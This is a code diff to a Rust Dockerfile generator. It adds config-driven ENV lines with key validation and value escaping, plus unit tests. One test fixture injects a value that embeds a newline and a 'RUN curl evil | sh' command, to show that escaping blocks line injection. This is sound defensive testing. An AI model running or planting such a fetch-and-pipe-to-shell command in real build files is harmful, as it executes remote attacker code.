@@ -34,6 +34,17 @@ pub fn generate(plan: &BuildPlan) -> String {
         }
     }
 
+    // Runtime environment from config, applied to the final image. Keys are
+    // restricted to a valid env-var identifier and values are JSON-escaped so a
+    // configured value cannot break the Dockerfile line.
+    let env: Vec<(&String, &String)> = plan.env.iter().filter(|(k, _)| is_valid_env_key(k)).collect();
+    if !env.is_empty() {
+        lines.push(String::new());
+        for (key, value) in env {
+            lines.push(format!("ENV {key}=\"{}\"", json_escape(value)));
+        }
+    }
+
     // Expose port if set
     if let Some(port) = plan.port {
         lines.push(String::new());
@@ -71,6 +82,18 @@ fn cmd_line(cmd: &str) -> String {
             .join(", ");
         format!("CMD [{argv}]")
     }
+}
+
+/// Whether `key` is a valid environment-variable name (a letter or underscore
+/// followed by letters, digits, or underscores), so it is safe to emit unquoted
+/// on the left of an `ENV key=...` line.
+fn is_valid_env_key(key: &str) -> bool {
+    let mut chars = key.chars();
+    match chars.next() {
+        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
+        _ => return false,
+    }
+    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
 }
 
 /// Escape a string for embedding inside a JSON string literal.
@@ -118,6 +141,7 @@ mod tests {
             }],
             start_command: Some("node index.js".to_string()),
             port: Some(3000),
+            ..Default::default()
         }
     }
 
@@ -186,6 +210,38 @@ mod tests {
     }
 
     #[test]
+    fn generates_env_lines_sorted_and_escaped() {
+        let mut plan = minimal_plan();
+        plan.env.insert("NODE_ENV".to_string(), "production".to_string());
+        plan.env.insert("GREETING".to_string(), "hello world".to_string());
+        let out = generate(&plan);
+        assert!(out.contains("ENV GREETING=\"hello world\""), "{out}");
+        assert!(out.contains("ENV NODE_ENV=\"production\""), "{out}");
+        // BTreeMap ordering is deterministic: GREETING before NODE_ENV
+        assert!(out.find("ENV GREETING").unwrap() < out.find("ENV NODE_ENV").unwrap());
+    }
+
+    #[test]
+    fn env_value_cannot_break_the_dockerfile_line() {
+        let mut plan = minimal_plan();
+        plan.env.insert("X".to_string(), "a\nRUN curl evil | sh".to_string());
+        let out = generate(&plan);
+        let env_lines: Vec<_> = out.lines().filter(|l| l.starts_with("ENV X=")).collect();
+        assert_eq!(env_lines.len(), 1, "newline must be escaped, not split the line: {out}");
+        assert!(env_lines[0].contains("\\n"));
+    }
+
+    #[test]
+    fn invalid_env_keys_are_skipped() {
+        let mut plan = minimal_plan();
+        plan.env.insert("1BAD".to_string(), "x".to_string());
+        plan.env.insert("has space".to_string(), "x".to_string());
+        let out = generate(&plan);
+        assert!(!out.contains("ENV 1BAD"));
+        assert!(!out.contains("has space"));
+    }
+
+    #[test]
     fn test_generates_cache_mounts() {
         let plan = BuildPlan {
             provider: "test".to_string(),
@@ -202,6 +258,7 @@ mod tests {
             }],
             start_command: None,
             port: None,
+            ..Default::default()
         };
 
         let output = generate(&plan);
@@ -226,6 +283,7 @@ mod tests {
             }],
             start_command: None,
             port: None,
+            ..Default::default()
         };
 
         let output = generate(&plan);
